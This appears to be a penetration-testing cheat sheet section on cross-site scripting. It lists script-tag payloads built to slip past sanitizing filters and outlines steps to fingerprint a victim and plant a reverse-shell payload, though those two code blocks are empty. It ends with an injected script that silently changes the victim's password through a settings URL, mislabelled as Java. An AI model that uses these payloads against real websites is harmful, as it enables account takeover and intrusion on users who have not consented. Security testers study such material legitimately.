#### XSS

1. Test capabilities of sanitizing script

   ```bash
   # Try straight tags
   <script>alert(1)</script>
   
   # See if it catches first instance only
   <script><script>alert(1)</script></script>
   
   # See if it performs recursively
   <scr<script>ipt>alert(1)</scr</script>ipt>
   
   # Check order of santization
   <scr<object>ipt>alert(1)</script>
   ```

2. Once the write method is found, insert code to fingerprint the target user.

   ```bash
   
   ```

3. Then modify the code for a malicious payload for a return shell.

   ```bash
   
   ```

Cause Java to fetch a URL when the page is displayed

```java
<script>fetch('/settings?new_password=pass123');</script>
```
